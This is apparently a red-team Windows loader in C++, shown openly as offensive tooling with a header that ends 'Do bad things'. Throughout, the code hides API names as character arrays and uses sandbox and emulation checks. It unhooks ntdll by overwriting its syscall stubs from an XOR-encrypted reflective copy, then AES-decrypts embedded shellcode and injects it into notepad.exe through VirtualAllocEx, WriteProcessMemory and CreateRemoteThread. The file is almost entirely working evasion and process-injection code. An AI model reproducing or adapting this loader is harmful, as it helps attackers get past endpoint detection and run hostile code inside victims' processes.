/* By 0xTriboulet
* > Make Reflective NTDLL
* > Assign memory for Reflective NTDLL
* > Run Reflective NTDLL as new thread
* > Overwrite hooked NTDLL with new NTDLL
* > Do bad things
*/
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <time.h>
#include <cstdlib>
#include <stdlib.h> 
#include <string>
#include <wincrypt.h>

#pragma comment(lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


//typedefs
typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI * CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * UnmapViewOfFile_t)(LPCVOID);
typedef LPVOID (WINAPI * pVirtualAllocExNuma) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef VOID (WINAPI *RtlMoveMemory_t) (VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
typedef LPVOID (WINAPI * VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

//strings
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sVirtualAllocExNuma[] = {'V','i','r','t','u','a','l','A','l','l','o','c','E','x','N','u','m','a',0x0};
unsigned char sImplant[] {'i', 'm', 'p', 'l', 'a', 'n', 't', '.', 'e', 'x', 'e', 0x0};


unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };


unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0x0};
unsigned char sRtlMoveMemory[] = {'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 0x0};
unsigned char sVirtualAllocEx[] = {'V','i','r','t','u','a','l','A','l','l','o','c','E','x', 0x0};

unsigned char xor_key[] = {'W','i','n','d','o','w','s','S','y','s','t','e','m','3','2',0x0};
size_t xor_key_len = sizeof(xor_key);

//Standard XOR Decryption, thanks @reenz0h
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j = rand();
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

//Classic Injection
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
	
	LPVOID pRemoteCode = (LPVOID) rand();
	HANDLE hThread = (HANDLE) rand();
	
	VirtualAllocEx_t VirtualAllocEx_p = (VirtualAllocEx_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAllocEx);
	pRemoteCode = VirtualAllocEx_p(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	
	if (hThread != NULL) {
			WaitForSingleObject(hThread, -1);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


//Classic find process by name
int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = rand();
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

//Standard AES Decryption, thanks @reenz0h
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	int i = 69;
	HCRYPTPROV hProv = (HCRYPTPROV) rand();
	HCRYPTHASH hHash = (HCRYPTHASH) rand();
	HCRYPTKEY hKey = (HCRYPTKEY) rand();

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return (i-69);
}

//Emulation checks, developed with help from @cocomelonc's code
int checkMe(){
	int result = rand();
	
	//check if being emulated
	SYSTEM_INFO s;
	MEMORYSTATUSEX ms;
	DWORD procNum;
	DWORD ram;

	//check name, it's clunky "on purpose"
	unsigned char lpFileName[200] = {0x0};
	GetModuleFileName(NULL,(char *)lpFileName,sizeof(lpFileName));
	
	char * token = strtok((char *)lpFileName,"\\");
	LPVOID mem = NULL;
	char * last = NULL;
	mem = (char *) malloc (9900000);
	memset(mem,99,6900000);
	if(mem == NULL){
		MessageBox(NULL,last,"HELLO! 0", MB_OKCANCEL);
		return rand();
	}
	free(mem);
	
	while(token != NULL){
		last = token;
		token = strtok(NULL,"\\");
	}
	result = strcmp(strlwr(last), (const char *) sImplant);
	
	if(result != 0){
		MessageBox(NULL,last,"HELLO! 1", MB_OKCANCEL);
		return rand();
	}
	
	// check number of processors
	GetSystemInfo(&s);
	procNum = s.dwNumberOfProcessors;
	if (procNum < 2)  {
		MessageBox(NULL,last,"HELLO! 2", MB_OKCANCEL);
		return rand();
	} 
	  
	// check RAM
	ms.dwLength = (DWORD) sizeof(ms);
	GlobalMemoryStatusEx(&ms);
	ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
	if (ram < 2)  {
		MessageBox(NULL,last,"HELLO! 3", MB_OKCANCEL);
		return rand();
	} 
	
	pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR) sVirtualAllocExNuma);
	mem = myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0);
	
	if (mem == NULL) {
		MessageBox(NULL,last,"HELLO! 4", MB_OKCANCEL);
		return rand();
	} 

	return 0;
}

int FindFirstSyscall(char * pMem, DWORD size){
	
	// gets the first byte of first syscall
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
	BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3
	
	// find first occurance of syscall+ret instructions
	for (i = 0; i < size - 3; i++) {
		if (!memcmp(pMem + i, pattern1, 3)) {
			offset = i;
			break;
		}
	}		
	
	// now find the beginning of the syscall
	for (i = 3; i < 50 ; i++) {
		if (!memcmp(pMem + offset - i, pattern2, 3)) {
			offset = offset - i + 3;
			printf("First syscall found at 0x%p\n", pMem + offset);
			break;
		}		
	}

	return offset;
}


int FindLastSysCall(char * pMem, DWORD size) {

	// returns the last byte of the last syscall
	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
	
	// backwards lookup
	for (i = size - 9; i > 0; i--) {
		if (!memcmp(pMem + i, pattern, 9)) {
			offset = i + 6;
			printf("Last syscall byte found at 0x%p\n", pMem + offset);
			break;
		}
	}		
	
	return offset;
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
/*
    UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);
	int i;
	
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
	RtlMoveMemory_t RtlMoveMemory_p = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sRtlMoveMemory);
	
	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) {
					// RWX failed!
					return -1;
			}
			// copy clean "syscall table" into ntdll memory
			DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			
			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
				DWORD SC_size = SC_end - SC_start;
				printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
				printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
				printf("size: %i\n", SC_size);
				//getchar();
				RtlMoveMemory_p( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
						(LPVOID)((DWORD_PTR) pCache + + SC_start),
						SC_size);
			}

			// restore original protection settings of ntdll
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) {
					// it failed
					return -1;
			}
			return 0;
		}
	}
	
	// failed? .text not found!
	return rand();
}


using namespace std;
//Encrypted ntdll
unsigned char raw_ntdll[] = {[...snip...]}

int main(VOID){

	if (checkMe() == 0){

		//Calc payload, to be used in classic injection
		unsigned char payload[] = { 0x3a, 0x8b, 0x7e, 0x67, 0x1b, 0xc5, 0xdd, 0x3d, 0x88, 0xcb, 0x50, 0xee, 0x7e, 0xe1, 0x78, 0xda, 0x6a, 0xe5, 0xb5, 0x1f, 0x37, 0x20, 0xe0, 0x43, 0x85, 0xeb, 0xcb, 0xed, 0x4b, 0x86, 0x23, 0xf3, 0x7c, 0xa4, 0x1e, 0xdf, 0x21, 0x4e, 0x4, 0x81, 0x3e, 0xcc, 0x55, 0x65, 0x8, 0x64, 0x9a, 0x93, 0x54, 0xb9, 0x1c, 0x7d, 0x4a, 0xe0, 0xdd, 0xc4, 0x40, 0x7a, 0x31, 0x52, 0x60, 0x89, 0x52, 0x2, 0x6e, 0x7e, 0x3a, 0xa2, 0xee, 0x36, 0x14, 0x63, 0xba, 0x34, 0xef, 0x94, 0xaf, 0x9f, 0x76, 0x12, 0xbc, 0x4c, 0x20, 0xe0, 0xc1, 0xcd, 0x58, 0xc4, 0x38, 0x93, 0x25, 0x9e, 0x4f, 0x45, 0xa0, 0xc, 0xcd, 0x77, 0x7f, 0xd7, 0x5b, 0xc5, 0x70, 0xc4, 0xf4, 0xad, 0xe4, 0x97, 0x6b, 0x28, 0x2e, 0xea, 0xf0, 0x28, 0x55, 0xe7, 0x79, 0xc5, 0x21, 0x36, 0x8, 0x20, 0x27, 0xb2, 0xc9, 0x34, 0x39, 0xee, 0x78, 0x4e, 0x8d, 0x98, 0x91, 0xe4, 0x8f, 0x73, 0x24, 0x8f, 0xb6, 0x14, 0x75, 0xc9, 0xd2, 0xbd, 0x3d, 0x61, 0xa6, 0x9b, 0xcf, 0x64, 0x75, 0x37, 0x7e, 0x70, 0xa1, 0xb0, 0xf, 0x4b, 0xf6, 0x7c, 0x4f, 0x4c, 0xad, 0x10, 0xd6, 0x7e, 0x89, 0xd4, 0xcf, 0xc1, 0xee, 0x60, 0x33, 0xdc, 0x80, 0xdf, 0x4d, 0xa7, 0xe5, 0x24, 0x53, 0xe, 0x28, 0x71, 0x96, 0x5e, 0x93, 0xab, 0x62, 0x48, 0xa1, 0x3f, 0x3a, 0x9c, 0x4d, 0x23, 0xc1, 0x6d, 0xf4, 0x7b, 0x91, 0xa8, 0x83, 0x36, 0xc2, 0xb9, 0x11, 0x62, 0xcf, 0xa6, 0x43, 0x3a, 0xd5, 0x87, 0x32, 0x36, 0x1a, 0xe, 0x17, 0xb4, 0x83, 0xef, 0xa4, 0x2b, 0x97, 0xd6, 0xac, 0x11, 0xdc, 0x31, 0xef, 0x94, 0xdb, 0xda, 0x1b, 0xb2, 0xb7, 0x77, 0x4e, 0x80, 0x6, 0xc1, 0xeb, 0xca, 0xc8, 0xa, 0xda, 0x6f, 0x7c, 0xa, 0x2a, 0x0, 0xd4, 0x43, 0xe1, 0xfc, 0x4, 0x59, 0xd9, 0x51, 0xbb, 0x18, 0x58, 0xbb, 0x91, 0xa1, 0x75, 0xa2, 0xa0, 0x35, 0x37, 0x5f, 0xc9, 0xa2, 0x12, 0xff, 0x3d, 0x89, 0x9a, 0xfe, 0xbc, 0x83, 0xe3, 0xf, 0xef, 0x6d, 0xc6, 0x5a };
		unsigned char payload_key[] = { 0xbc, 0x3e, 0xe8, 0x33, 0x3c, 0xaf, 0x28, 0x28, 0x29, 0xad, 0x5, 0xd2, 0x76, 0x3f, 0x1e, 0xbb };
		unsigned int payload_len = sizeof(payload);
		
		unsigned int raw_ntdll_len = sizeof(raw_ntdll);
		
		//Trying initializing with rand()
		int pid = rand();
		HANDLE hProc = (HANDLE) rand();
		LPVOID exec_mem = (LPVOID) rand();
		int rv = (int) rand();
		HANDLE hFile = (HANDLE) rand();
		DWORD oldprotect = (DWORD) rand();	
		
		printf("Passed emulation checks!\n");
		XOR((char *) raw_ntdll,raw_ntdll_len,(char*) xor_key,xor_key_len);

		//Function Pointers
		VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
		VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAlloc);
		RtlMoveMemory_t RtlMoveMemory_p = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sRtlMoveMemory);
		
		//Make executable memory
		exec_mem = VirtualAlloc_p(NULL, raw_ntdll_len, MEM_COMMIT, PAGE_READWRITE);
		RtlMoveMemory_p(exec_mem, raw_ntdll, raw_ntdll_len);
		VirtualProtect_p(exec_mem, raw_ntdll_len, PAGE_EXECUTE_READWRITE, &oldprotect);
		
		//Create Sacrificial Thread
		hFile = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(hFile, -1);
		
		printf("Remove hooks?\n");
		getchar();
		
		//UnhookNtdll
		UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), exec_mem);
		
		printf("Check hooks");
		getchar();
		
		printf("Completed loading ntdll!\n");
		
		//printf("Looking for target...\n");
		pid = FindTarget("notepad.exe");

		if (pid) {
			printf("Notepad.exe PID = %d\n", pid);

			// try to open target process
			hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
							PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
							FALSE, (DWORD) pid);

			if (hProc != NULL) {
				// Decrypt payload
				AESDecrypt((char *) payload, payload_len, (char *) payload_key, sizeof(payload_key));
				
				Inject(hProc, payload, payload_len);
				CloseHandle(hProc);
			}
		}
		
		//getchar();
	}else{
		printf("Failed emulation checks!");
	}
	return 0;
}